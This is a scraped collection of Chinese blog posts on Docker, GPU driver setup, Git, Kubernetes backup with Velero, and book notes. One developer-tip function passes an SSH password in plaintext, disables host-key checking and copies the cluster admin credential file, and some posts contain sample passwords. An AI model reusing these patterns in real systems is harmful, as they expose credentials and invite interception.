/go/src/github.com/shaowenchen/goproject WORKDIR /go/src/github.com/shaowenchen/goproject RUN CGO_ENABLED=0 GO111MODULE=on GOOS=linux GOARCH=amd64 GOFLAGS=-mod=vendor go build -i -ldflags \u0026#39;-w -s\u0026#39; -o myserver cmd/myserver/apiserver.go FROM alpine:3.9 RUN apk add --update ca-certificates \u0026amp;\u0026amp; update-ca-certificates COPY --from=builder /go/src/github.com/shaowenchen/goproject/myserver /usr/local/bin/ CMD [\u0026#34;sh\u0026#34;] 上面是一个编译 Go 工程镜像的 Dockerfile 文件。很多项目选择 alpine 作为基础镜像。但是，如果项目使用到系统的某些库，基础镜像不能随意选择。\n2. 利用缓存构建 Docker 镜像是分层的结构，最多 127 层。除了 FROM 命令，Dockerfile 中其他命令都会生成一个新的镜像层。在构建过程中，如果发现命令将产生的镜像层与之前的一样，则会使用缓存复用。\n为了利用缓存加速构建过程，可以将静态和配置命令放在前面，而将经常变化的内容放在后面。\n1 2 3 4 5 6 FROM stackaero/nodejs-pm2-slim：1.1.5 WORKDIR /app COPY package.json /app/ RUN npm install COPY . /app/ CMD pm2 start ./index.js --no-daemon \u0026gt;\u0026gt; /dev/null 由于项目工程代码每次构建时，总会发生变化，应该尽量放在底部；依赖包不会经常发生变化，放在上面可以充分利用缓存。\n使用下面的构建命令，可以禁用缓存：\n1 docker build --no-cache 3. 使用 S2I 打包应用 相对于使用缓存优化构建速度，更加简单的方式是，使用 S2I 打包应用，增加一层镜像即可。\n参考链接：使用 S2I 构建云原生应用\n没有被 S2I 支持的语言或框架也没关系，我们可以将应用所需的基础环境打包成基础镜像，然后再进行构建。\n4. .dockerignore 文件 Docker 以 C/S 模型进行工作，在执行构建时，会将所需的文件发送到 Docker Daemon 。有些很大、构建用不上的文件，会占用传输时间，我们可以定义 .dockerignore 忽略这些文件，就像 .gitignore 一样。\n.dockerignore 文件\n.git Dockerfile 文件\n1 2 3 FROM golang:1.12 as builder COPY / /go/src/github.com/shaowenchen/goproject 上面的例子，COPY 时会忽略 .git 目录。\n5. 将容器保存为镜像 在学习 Docker 时，经常会被教育不要在容器中做任何修改。这句话没错，遵循不可变的基础设施。\n除了打包镜像，我们会直接进入容器进行调试。有时因为历史原因，找不到镜像或 Dockerfile 文件，需要将容器保存为镜像。\n执行 docker commit 命令，可以将 ContainerID 保存为 shaowenchen/myimage:latest 镜像。\n1 docker commit ContainerID shaowenchen/myimage:latest ","description":"","id":327,"section":"post","tags":["博文","Docker","Tips"],"title":"你不知道的 Docker 使用技巧","uri":"https://www.chenshaowen.com/blog/docker-skills-you-do-not-notice.html"},{"content":" 前面写过一篇文档，如何在 CentOS 安装 GPU 驱动 ，这篇就来看看怎么利用 Docker 运行 Tensorflow 。\n1. 检查当前 CPU 支持的 Tensorflow 版本 在不支持 AVX 指令的 CPU 上，运行 Tensorflow \u0026gt; 1.15 版本时，会报错，Illegal instruction (core dumped)。\n执行检测命令：\n1 2 3 cat /proc/cpuinfo | grep avx flags\t: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx rdtscp lm constant_tsc rep_good nopl xtopology eagerfpu pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch fsgsbase bmi1 hle avx2 smep bmi2 erms invpcid rtm rdseed adx smap xsaveopt arat 如果有查询结果，说明支持。常见的 CPU 体系结构 SandyBridge, IvyBridge, Haswell, Broadwell, Skylake, CasecadeLake 都支持 AVX 指令，除了 Westmere 。\n2. GPU\\CPU 模式运行 使用如下脚本查看运行环境中的设备：\n1 2 from tensorflow.python.client import device_lib device_lib.list_local_devices() 分别起两个版本的 Jupyter 。\nGPU 1 2 mkdir ~/notebooks docker run --name tf-gpu -d --runtime=nvidia --rm -it -v $(realpath ~/notebooks):/tf/notebooks -p 8881:8888 tensorflow/tensorflow:latest-gpu-jupyter 查看登录秘钥，返回的 token 值为登录秘钥。\n1 2 3 4 5 6 7 8 9 docker exec -it tf-gpu cat /root/.local/share/jupyter/runtime/nbserver-1-open.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;p\u0026gt; This page should redirect you to Jupyter Notebook. If it doesn\u0026#39;t, \u0026lt;a href=\u0026#34;http://0.0.0.0:8888/tree?token={{token}}\u0026#34;\u0026gt;click here to go to Jupyter\u0026lt;/a\u0026gt;. \u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; CPU 1 2 mkdir ~/notebooks docker run --name tf-cpu -d --rm -it -v $(realpath ~/notebooks):/tf/notebooks -p 8882:8888 tensorflow/tensorflow:latest-jupyter 查看登录秘钥，返回的 token 值为登录秘钥。\n1 2 3 4 5 6 7 8 9 docker exec -it tf-cpu cat /root/.local/share/jupyter/runtime/nbserver-1-open.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;p\u0026gt; This page should redirect you to Jupyter Notebook. If it doesn\u0026#39;t, \u0026lt;a href=\u0026#34;http://0.0.0.0:8888/tree?token={{token}}\u0026#34;\u0026gt;click here to go to Jupyter\u0026lt;/a\u0026gt;. \u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; 3. 参考链接 https://github.com/nvidia/nvidia-container-runtime ","description":"","id":328,"section":"post","tags":["博文","GPU","Tensorflow","Docker"],"title":"使用 Docker 运行 Tensorflow","uri":"https://www.chenshaowen.com/blog/run-tensorflow-on-docker.html"},{"content":"原作名: On China\n作者: [美]基辛格\n译者: 胡利平/林华/杨韵琴/朱敬文\n出版社: 中信出版社\n出版年: 2012-10\nISBN: 9787508635583\nNotes:\n作者是美国著名的学者、政治家，给予本书不一样的视角，记录了中国近代、当代、现代的外交政策与决策机制。书中描述的各类事件很多，领导人之前相互博弈，国家之间相互对抗。从屈辱，到发展，最后崛起，中国跃然走上了世界舞台，越来越有活力。\n历史，总是在此起彼伏、有上有下中，向前推进。事后诸葛亮是最容易的事，我们并不比决策者更擅长做决定，而是掌握的信息、考虑的方面不够多，阻碍了我们理解决策。\n全球每年都有不少人死于战火，当前中国的和平发展来之不易。\n","description":"","id":329,"section":"post","tags":["书籍","历史","政策"],"title":"论中国","uri":"https://www.chenshaowen.com/blog/book/on-china.html"},{"content":"1. 什么是左移 需要说明的是，这里的左不是政治上代表保守或激进的左，而是表意流程的左、时间的提前。\n在调研自动化测试时，我第一次接触 \u0026ldquo;左移\u0026rdquo; 。提法很吸引，落地很简单。翻译一下就是，之前测试的工作是开发完成之后，现在要求提前，测试尽量早地参与开发过程，进行全程的跟踪、管理、测试。\n除了测试，开发也可以从这一概念中获益。提前流程，尽早参与，完成一个一个小的迭代，这不就是敏捷开发吗？开发完成迭代之后，就进行交付，而不是等到最终。这一过程有效地预防了开发过程中可能发生的方向性错误。\n2019 年底发生了肺炎疫情，持续数月之后，我在电视上再次听到这个词，\u0026ldquo;左\u0026rdquo; 。大意是针对肺炎疫情，采取了一些提前干预，积极主动的措施。这触发了我对左的再次思考。\n2. 认知的过程 通常，我们所见的只是起点 A ，终点 Z 。\n我们播撒种子，按时浇水施肥，等待收获。可能丰收，也可能歉收。\n随着时间流逝，或者重要性提升，我们对其投入更多智力，由此获得更多认知。结合现有的知识体系，对其进行猜想与验证，完善认知。\n这个过程可能会持续很久，甚至很多积累被彻底推翻。\n即使是 《Nature》上发表的文章，很多都经不起数十年的检验，经常得出一些现在看来显而易见的错误结论。一旦基石崩溃，大厦也将倾覆。\n但这并不意味着我们更高明。时代的基础认知，限制了人的思维，得出了合适的结论。我说合适，是因为这个结论能被解释。随着基础认知的不断更新，结论会再一次得到更替。\n3. 干预的过程 合适的结论有着积极的意义，能指导干预。干预是需要物质条件的，也是能够直接创造普世价值的。\n认知越精细化、越深入，越有利于干预。找出关键因素，提前干预，是成本最小，收益最大的生产方式。\n左移实际上就是在提前干预，是机会，也蕴含挑战。进行左移的前提是储备足够的认知，否则一旦方向性错误，毁灭将会是颠覆性的。这是战略的方面。\n当然任何事情都不可能等到 100 % 确定，很多时候都是权衡利弊之后，倾向于一方，剩下的就是战术上的积极调整。\n","description":"","id":330,"section":"post","tags":["博文","思考","什么是"],"title":"什么是左移","uri":"https://www.chenshaowen.com/blog/what-is-left-shift.html"},{"content":" 这里以清空 main 历史提交记录为例。\n切换到 main 分支 1 git checkout main 创建一个干净的分支 1 git checkout --orphan new_main 提交全部文件 1 2 git add -A git commit -m \u0026#34;msg\u0026#34; 删除 main 分支 1 git branch -D main 将新分支重命名为 main 1 git branch -m main 强制推动到远程仓库 1 git push -f origin main ","description":"","id":331,"section":"post","tags":["博文","Tips"],"title":"如何清空 Git 仓库全部历史记录","uri":"https://www.chenshaowen.com/blog/how-to-clear-commit-history-of-git.html"},{"content":"作者: 一禅小和尚\n出版社: 江苏凤凰文艺出版社\n出版年: 2017-09\nISBN: 9787559411013\nNotes:\n简明的画风，一禅小和尚带领大家走进了一个充满善意与智慧的世界。\n如果你身陷囹圄、烦恼于生活琐屑，这本书定能给予你启发。\n但知易行难，人生就是一场修行，愿与小和尚同在。\n","description":"","id":332,"section":"post","tags":["书籍","漫画"],"title":"一禅小和尚","uri":"https://www.chenshaowen.com/blog/book/a-little-monk-in-one-zen.html"},{"content":"作者: 食家饭\n出版社: 北京联合出版公司\n出版年: 2017-3-2\nISBN: 9787550294509\nNotes:\n有风吹过的厨房，夹带着人间的气息。一道道美味的菜品，让人边看边流口水。作者对生活一定也充满了热爱。\n写的是寻常可见的菜，但文字十分俏皮、乃至有些可爱，角度不凡，细腻动人。看完对上海人平添了几分好感。\n","description":"","id":333,"section":"post","tags":["书籍","厨房"],"title":"有风吹过厨房","uri":"https://www.chenshaowen.com/blog/book/the-wind-through-kitchen.html"},{"content":"作者: 但斌\n副标题: 但斌投资札记\n出版社: 中信出版社\n出版年: 2018-06\nISBN: 9787508688640\nNotes:\n本书主要收录 200X 年，作者关于投资的思考和分析。北岛的《时间的玫瑰》陪伴作者度过了最艰难的时光，遂取同名。\n一个人过往的经历，决定了未来选择的路。经历过艰苦，思考过死亡，作者的思维非常宏大，考虑问题的维度是百年、乃至千年。\n因而，在价值投资的路上，作者可以忍受住短期的起起伏伏。不会为上涨而卖，不会为下跌而买，心中有所坚持，就像航海有了灯塔一般。\n道理很简单易懂，但一说就会，一做就错。另外，不怕会一万种招试的人，就怕一种招试练一万遍的人。\n作者既身体力行实践，又取得了斐然的成绩，还能对理念有所布道，值得钦佩。\n智慧之光是平等的，从各行各业中广泛获取知识是十分必要与迫切的。\n","description":"","id":334,"section":"post","tags":["书籍","金融"],"title":"时间的玫瑰","uri":"https://www.chenshaowen.com/blog/book/roses-of-time.html"},{"content":" 以 CentOS 7.7，Tesla P100 GPU 为例。\n1. 基础环境准备 安装 lspci 命令 1 yum install -y pciutils 检查 GPU 是否支持 CUDA 1 2 3 lspci | grep -i nvidia 00:09.0 3D controller: NVIDIA Corporation GP100GL [Tesla P100 PCIe 12GB] (rev a1) 支持 CUDA 的 GPU 列表：https://developer.nvidia.com/cuda-gpus\n检查系统是否支持 CUDA 1 2 3 4 uname -m \u0026amp;\u0026amp; cat /etc/redhat-release x86_64 CentOS Linux release 7.7.1908 (Core) 支持 CUDA 的 OS 列表：https://docs.nvidia.com/cuda/cuda-installation-guide-linux/index.html#system-requirements\n安装系统工具包 1 2 3 yum update -y yum install -y wget vim gcc yum install kernel-devel-$(uname -r) kernel-headers-$(uname -r) 安装 Docker 需要安装不低于 19.03 的版本，参考链接 。\n安装 Docker 参考链接: CentOS 7 安装指定版本的 Docker 。\n2. 安装 GPU 驱动 \u0026amp; CUDA 2.1 禁用系统默认的 nouveau 驱动 屏蔽前:\n1 2 3 4 5 6 7 8 9 10 lsmod | grep nouveau nouveau 1898794 0 mxm_wmi 13021 1 nouveau wmi 21636 2 mxm_wmi,nouveau video 24538 1 nouveau i2c_algo_bit 13413 1 nouveau ttm 96673 2 bochs_drm,nouveau drm_kms_helper 186531 2 bochs_drm,nouveau drm 456166 5 ttm,bochs_drm,drm_kms_helper,nouveau 禁用 nouveau :\n1 2 bash -c \u0026#34;echo blacklist nouveau \u0026gt; /etc/modprobe.d/blacklist-nvidia-nouveau.conf\u0026#34; bash -c \u0026#34;echo options nouveau modeset=0 \u0026gt;\u0026gt; /etc/modprobe.d/blacklist-nvidia-nouveau.conf\u0026#34; 重建 initramfs image\n1 2 mv /boot/initramfs-$(uname -r).img /boot/initramfs-$(uname -r).img.bak dracut /boot/initramfs-$(uname -r).img $(uname -r) 重启系统，屏蔽后:\n1 2 3 lsmod | grep nouveau (结果为空) 2.2 安装 GPU 驱动 有两种安装方法：\n第一种，安装 kmod-nvidia 驱动 添加源\n1 2 rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-2.el7.elrepo.noarch.rpm 安装 nvidia-detect :\n1 yum install -y nvidia-detect 检测是否有对应的 kmod-nvidia 版本:\n1 nvidia-detect -v 安装 kmod-nvidia 驱动:\n1 yum install -y kmod-nvidia 第二种，下载官网驱动安装 在 Nvidia 官网 驱动下载 页面，找到 lspci | grep -i nvidia 命令显示的 GPU 类型。\n1 2 wget http://cn.download.nvidia.com/tesla/440.64.00/nvidia-driver-local-repo-rhel7-440.64.00-1.0-1.x86_64.rpm rpm -Uvh nvidia-driver-local-repo-rhel7-440.64.00-1.0-1.x86_64.rpm 也可以下载 Shell 脚本安装\n1 2 3 wget http://us.download.nvidia.com/tesla/440.33.01/NVIDIA-Linux-x86_64-440.64.00.run chmod +x NVIDIA-Linux-x86_64-440.64.00.run bash ./NVIDIA-Linux-x86_64-440.64.00.run 2.3 安装 CUDA 在 Nvidia 开发者 cuda-toolkit-archive 页面，找到最新版本的工具包。根据页面提示，选择自己的操作系统，下面是 CentOS 7.7 得到的安装命令：\n1 2 3 4 5 wget http://developer.download.nvidia.com/compute/cuda/10.2/Prod/local_installers/cuda-repo-rhel7-10-2-local-10.2.89-440.33.01-1.0-1.x86_64.rpm sudo rpm -i cuda-repo-rhel7-10-2-local-10.2.89-440.33.01-1.0-1.x86_64.rpm sudo yum clean all sudo yum -y install nvidia-driver-latest-dkms cuda sudo yum -y install cuda-drivers 2.4 验证是否安装成功 重启机器之后，检测 Nvidia CUDA 是否安装成功。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 nvidia-smi +-----------------------------------------------------------------------------+ | NVIDIA-SMI 440.82 Driver Version: 440.82 CUDA Version: 10.2 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | |===============================+======================+======================| | 0 Tesla P100-PCIE... Off | 00000000:00:09.0 Off | 0 | | N/A 35C P0 27W / 250W | 0MiB / 12198MiB | 6% Default | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: GPU Memory | | GPU PID Type Process name Usage | |=============================================================================| | No running processes found | +-----------------------------------------------------------------------------+ 3. 安装 nvidia-docker nvidia-docker 提供了在 Docker 中使用 GPU 加速的支持。\n安装 nvidia-docker 1 2 3 distribution=$(. /etc/os-release;echo $ID$VERSION_ID) curl -s -L https://nvidia.github.io/nvidia-docker/$distribution/nvidia-docker.repo | sudo tee /etc/yum.repos.d/nvidia-docker.repo yum install -y nvidia-container-runtime nvidia-container-toolkit nvidia-docker2 添加新的 runtime 编辑 /etc/docker/daemon.json 文件，新增如下内容：\n1 2 3 4 5 6 7 8 { \u0026#34;runtimes\u0026#34;: { \u0026#34;nvidia\u0026#34;: { \u0026#34;path\u0026#34;: \u0026#34;/usr/bin/nvidia-container-runtime\u0026#34;, \u0026#34;runtimeArgs\u0026#34;: [] } } } 重启 Docker 生效 1 systemctl restart docker 验证是否安装成功 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 docker run --gpus all nvidia/cuda:10.0-base nvidia-smi +-----------------------------------------------------------------------------+ | NVIDIA-SMI 440.82 Driver Version: 440.82 CUDA Version: 10.2 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | |===============================+======================+======================| | 0 Tesla P100-PCIE... Off | 00000000:00:09.0 Off | 0 | | N/A 36C P0 26W / 250W | 0MiB / 12198MiB | 6% Default | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: GPU Memory | | GPU PID Type Process name Usage | |=============================================================================| | No running processes found | +-----------------------------------------------------------------------------+ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 docker run --runtime=nvidia nvidia/cuda:10.0-base nvidia-smi +-----------------------------------------------------------------------------+ | NVIDIA-SMI 440.82 Driver Version: 440.82 CUDA Version: 10.2 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | |===============================+======================+======================| | 0 Tesla P100-PCIE... Off | 00000000:00:09.0 Off | 0 | | N/A 36C P0 26W / 250W | 0MiB / 12198MiB | 0% Default | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: GPU Memory | | GPU PID Type Process name Usage | |=============================================================================| | No running processes found | +-----------------------------------------------------------------------------+ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 nvidia-docker run nvidia/cuda:10.0-base nvidia-smi +-----------------------------------------------------------------------------+ | NVIDIA-SMI 440.82 Driver Version: 440.82 CUDA Version: 10.2 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | |===============================+======================+======================| | 0 Tesla P100-PCIE... Off | 00000000:00:09.0 Off | 0 | | N/A 35C P0 26W / 250W | 0MiB / 12198MiB | 6% Default | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: GPU Memory | | GPU PID Type Process name Usage | |=============================================================================| | No running processes found | +-----------------------------------------------------------------------------+ 4. 参考 https://github.com/NVIDIA/nvidia-docker ","description":"","id":335,"section":"post","tags":["博文","Docker","GPU"],"title":"如何在 CentOS 安装 GPU 驱动","uri":"https://www.chenshaowen.com/blog/how-to-install-gpu-driver-in-centos.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. macOS 快速切换不同 Kubernetes 环境 涉及 Kubernetes 相关开发时，经常需要在多个集群之间切换。配置多集群 context 是一个选择，但是如果集群在不断重置，可以试下如下方法：\n在 ~/.profile 文件中定义一系列相关 function，切换时只需要执行 on_cluster_name 即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 # Switch Kubernetes Cluster function switch_kubeconfig(){ sudo sed -i \u0026#34;\u0026#34; \u0026#34;/$2/d\u0026#34; /etc/hosts sudo echo \u0026#34;$1 $2\u0026#34; \u0026gt;\u0026gt; /etc/hosts if test -f ~/.ssh/known_hosts; then sed -i \u0026#34;\u0026#34; \u0026#39;/kubernetes.default/d\u0026#39; ~/.ssh/known_hosts fi sshpass -p \u0026#34;your_password\u0026#34; ssh -o StrictHostKeyChecking=no root@$1 \u0026#34;cat /etc/kubernetes/admin.conf\u0026#34; \u0026gt; ~/.kube/config } function on_dev1(){ switch_kubeconfig 10.10.10.11 kubernetes.default } 2. OS X 上，执行 git 命令报错，xcrun: error 升级最新版本 OS X 之后，执行 git pull 命令，提示错误：\n1 2 3 4 git pull xcrun: error: invalid active developer path (/Library/Developer/CommandLineTools), missing xcrun at: /Library/Developer/CommandLineTools/usr/bin/xcrun 需要安装 Xcode toolkit :\n1 xcode-select --install 如果依然报错，可以尝试重置:\n1 sudo xcode-select --reset 3. Dockerfile 多个 From 指令 多个 From 指令生成的镜像，以最后一个 From 为准。\n多个 From 指令是为了区分不同构建阶段，比如，构建与运行环境的分离。例如：\n1 2 3 4 5 6 7 8 9 10 11 FROM golang:1.12 as controller-manager-builder COPY / /go/src/myapp WORKDIR /go/src/myapp RUN CGO_ENABLED=0 GO111MODULE=on GOOS=linux GOARCH=amd64 GOFLAGS=-mod=vendor go build --ldflags \u0026#34;-extldflags -static\u0026#34; -o controller-manager ./cmd/controller-manager/ FROM alpine:3.7 RUN apk add --update ca-certificates \u0026amp;\u0026amp; update-ca-certificates COPY --from=controller-manager-builder /go/src/myapp/controller-manager /usr/local/bin/ CMD controller-manager golang 镜像用于构建源码，alpine 镜像用于运行程序，两者的关联在于 COPY --from= 将二进制从一个镜像拷贝到另外一个镜像。\n4. 给 Pod 附加容器，调试 Kubernetes 运行环境 在 Service Mesh 中，为了减少对原有系统的干扰，推荐采用 Sidecar 模式进行设计和实践。Sidecar 设计模式可以给应用程序添加新的功能，而无需额外第三方组件的配置和代码。\n借助 Sidecar ，可以对运行中的容器或未运行的容器环境进行处理，解决一些运维问题。\n第一步，添加 Sidecar 容器，共享存储、网络等\n1 2 3 4 5 6 7 8 9 10 11 12 13 Containers: - name: sidecar image: busybox:1.28.4 command: - sleep - \u0026#34;3600\u0026#34; imagePullPolicy: IfNotPresent resources: {} terminationMessagePath: /dev/termination-log terminationMessagePolicy: File volumeMounts: - name: db-persistent-storage mountPath: /var/lib/mysql 第二步，进入 Sidecar 容器解决运维故障\n1 kubectl exec -it {POD_NAME} -c sidecar sh 参考，Istio Sidecar 注入：例外和除错。\n5. CentOS 7 安装 GLIBC 2.18 查看已经安装的 GLIBC 版本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 strings /lib64/libc.so.6 |grep GLIBC_* GLIBC_2.2.5 GLIBC_2.2.6 GLIBC_2.3 GLIBC_2.3.2 GLIBC_2.3.3 GLIBC_2.3.4 GLIBC_2.4 GLIBC_2.5 GLIBC_2.6 GLIBC_2.7 GLIBC_2.8 GLIBC_2.9 GLIBC_2.10 GLIBC_2.11 GLIBC_2.12 GLIBC_2.13 GLIBC_2.14 GLIBC_2.15 GLIBC_2.16 GLIBC_2.17 安装 GLIBC 2.18 1 2 3 4 5 6 7 wget http://ftp.gnu.org/gnu/glibc/glibc-2.XX.tar.gz tar -xvf glibc-2.18.tar.gz cd glibc-2.18 mkdir build \u0026amp;\u0026amp; cd build ../configure --prefix=/usr make -j4 make install ","description":"","id":336,"section":"post","tags":["博文","Tips","Kubernetes","环境","Docker"],"title":"开发 Tips（19）","uri":"https://www.chenshaowen.com/blog/developing-tips-19.html"},{"content":"1. Velero 简介 Velero 是 heptio 团队（被 VMWare 收购）开源的 Kubernetes 集群备份、迁移工具。\nVelero 使用对象存储保存集群资源。默认支持的对象存储有 AWS、Azure、GCP ，兼容 S3 协议，也可以通过插件来扩展到其他平台，比如 Aliyun OSS。\n目前，Velero 不具备版本管理功能，只能进行增量恢复，不会进行删除或覆盖操作。\n2. Velero 工作原理 Velero 首先会在集群中创建各种 CRD 以及相关的控制器，通过对 CRD 对象的操作完成备份、恢复行为。Velero 的工作原理图如下：\nVelero 客户端调用 Kubernetes API 服务器创建 Backup 对象。 BackupController 监听 Backup 对象变化，以执行备份过程。 备份时，BackupController 通过 API Server 查询相关数据。 备份后，BackupController 将数据上传到对象存储。 运维拓扑图如下：\n在所有集群上安装 Velero，运维人员通过 Velero Client 给 Velero Server 发送备份、恢复请求。Velero Server 推拉指定的 Kubernetes 对象的数据。这些数据以 Json 格式压缩存储在对象存储服务中。\n下图是备份数据的目录结构：\n3. 安装 Velero 3.1 下载文件 二进制文件下载地址：Github。\n这里以 CentOS 操作系统、Velero 1.1.0 为例：\n下载二进制文件，然后复制到 /user/local/bin 目录下。\n下载压缩包 1 2 wget https://github.com/vmware-tanzu/velero/releases/download/v1.1.0/velero-v1.1.0-linux-amd64.tar.gz tar xvf velero-v1.1.0-linux-amd64.tar.gz 查看目录结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 cd velero-v1.1.0-linux-amd64 tree . . |-- examples | |-- minio | | `-- 00-minio-deployment.yaml | |-- nginx-app | | |-- base.yaml | | |-- README.md | | `-- with-pv.yaml | `-- README.md |-- LICENSE `-- velero 3.2 配置对象存储服务 考虑到可能没有直接可用的对象存储服务，本文使用 Velero 提供的 minio 搭建一个对象存储服务。如果是公有云服务，这里部署 minio 的步骤可以省略，只需要创建 credentials-velero 文件。\n创建 minio 服务 设置为 NodePort 类型 1 sed -i \u0026#34;/type: /s#ClusterIP#NodePort#\u0026#34; examples/minio/00-minio-deployment.yaml 创建 minio 服务 1 kubectl apply -f examples/minio/00-minio-deployment.yaml 查看 service 访问端口 1 2 3 4 kubectl get svc -n velero NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE minio NodePort 10.233.34.181 \u0026lt;none\u0026gt; 9000:31489/TCP 60s 这里的 {minio_service_ip}:31489 服务将被用于存储 Velero 的备份数据。\n创建 minio 的访问密钥文件 credentials-velero 1 2 3 4 5 cat \u0026lt;\u0026lt;\u0026#39;EOF\u0026#39; \u0026gt; credentials-velero [default] aws_access_key_id = minio aws_secret_access_key = minio123 EOF 1 2 3 ls credentials-velero examples LICENSE velero 3.3 安装 Velero 客户端 拷贝可执行文件 velero\n1 cp velero /usr/local/bin/ 3.4 安装 Velero 服务端 执行安装命令\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 velero install \\ --image velero/velero:v1.1.0 \\ --provider aws \\ --bucket velero \\ --namespace velero \\ --secret-file ./credentials-velero \\ --velero-pod-cpu-request 200m \\ --velero-pod-mem-request 200Mi \\ --velero-pod-cpu-limit 1000m \\ --velero-pod-mem-limit 1000Mi \\ --use-volume-snapshots=false \\ --use-restic \\ --restic-pod-cpu-request 200m \\ --restic-pod-mem-request 200Mi \\ --restic-pod-cpu-limit 1000m \\ --restic-pod-mem-limit 1000Mi \\ --backup-location-config region=minio,s3ForcePathStyle=\u0026#34;true\u0026#34;,s3Url=http://{minio_service_ip}:31489 1.2.0 版本，需要增加 --plugins velero/velero-plugin-for-aws:v1.0.0 参数。\n相关参数在官方文档中有所描述，值得注意的是 use-restic 开启了 PV 备份的支持。\n执行安装命令，会有回显日志。下面继续查看新创建的相关资源:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 kubectl get crd|grep velero NAME CREATED AT backups.velero.io 2019-12-24T01:39:51Z backupstoragelocations.velero.io 2019-12-24T01:39:51Z deletebackuprequests.velero.io 2019-12-24T01:39:51Z downloadrequests.velero.io 2019-12-24T01:39:51Z podvolumebackups.velero.io 2019-12-24T01:39:51Z podvolumerestores.velero.io 2019-12-24T01:39:51Z resticrepositories.velero.io 2019-12-24T01:39:51Z restores.velero.io 2019-12-24T01:39:51Z schedules.velero.io 2019-12-24T01:39:51Z serverstatusrequests.velero.io 2019-12-24T01:39:51Z volumesnapshotlocations.velero.io 2019-12-24T01:39:51Z 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 kubectl get all -n velero NAME READY STATUS RESTARTS AGE pod/minio-fdd868c5-bl2gl 1/1 Running 0 13h pod/minio-setup-sm2jb 0/1 Completed 2 13h pod/restic-997lt 1/1 Running 0 4m40s pod/restic-kg549 1/1 Running 0 4m40s pod/restic-wjxvw 1/1 Running 0 4m40s pod/velero-67c9ff9c66-llwqs 1/1 Running 0 4m41s NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/minio NodePort 10.233.34.181 \u0026lt;none\u0026gt; 9000:31639/TCP 13h NAME DESIRED CURRENT READY UP-TO-DATE AVAILABLE NODE SELECTOR AGE daemonset.apps/restic 3 3 3 3 3 \u0026lt;none\u0026gt; 4m40s NAME READY UP-TO-DATE AVAILABLE AGE deployment.apps/minio 1/1 1 1 13h deployment.apps/velero 1/1 1 1 4m41s NAME DESIRED CURRENT READY AGE replicaset.apps/minio-fdd868c5 1 1 1 13h replicaset.apps/velero-67c9ff9c66 1 1 1 4m41s NAME COMPLETIONS DURATION AGE job.batch/minio-setup 1/1 23s 13h 可以看到相关服务已经正常运行，Job 任务正常完成退出，大量 CRD 被创建。\n4. 使用测试 4.1 备份 - 集群 A 创建没有 PV 的负载 1 2 kubectl create ns velero-test kubectl run nginx --image=nginx -n velero-test 创建带有 PV 的负载 1 2 3 4 5 helm install stable/wordpress \\ --namespace velero-test \\ --set service.type=NodePort \\ --set wordpressUsername=admin \\ --set wordpressPassword=Pass@Word 获取服务端口\n1 2 3 4 5 kubectl get svc -n velero-test NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE harping-bison-mariadb ClusterIP 10.233.17.43 \u0026lt;none\u0026gt; 3306/TCP 2m36s harping-bison-wordpress NodePort 10.233.15.158 \u0026lt;none\u0026gt; 80:30979/TCP,443:30561/TCP 2m36s 访问 http://{cluster_a_ip}:30979 ， 使用安装时设置的账户密码登录 Wordpress，进行一些简单的操作，比如发表一篇文章，用于验证 PV 的迁移。\n备份 PV 需要使用 restic 。但 restic 不支持 hostPath、需要 Kubernetes v1.10.0 及以上版本、需要对 POD 使用 annotate 提前标记。下面是标记命令模板：\n1 kubectl -n YOUR_POD_NAMESPACE annotate pod/YOUR_POD_NAME backup.velero.io/backup-volumes=YOUR_VOLUME_NAME_1,YOUR_VOLUME_NAME_2,... 查找 Wordpress 相关 Pod，这里有两个，下面仅截取了 Volumes 部分：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 kubectl describe pod -n velero-test Name: harping-bison-mariadb-0 Volumes: data: Type: PersistentVolumeClaim (a reference to a PersistentVolumeClaim in the same namespace) ClaimName: data-harping-bison-mariadb-0 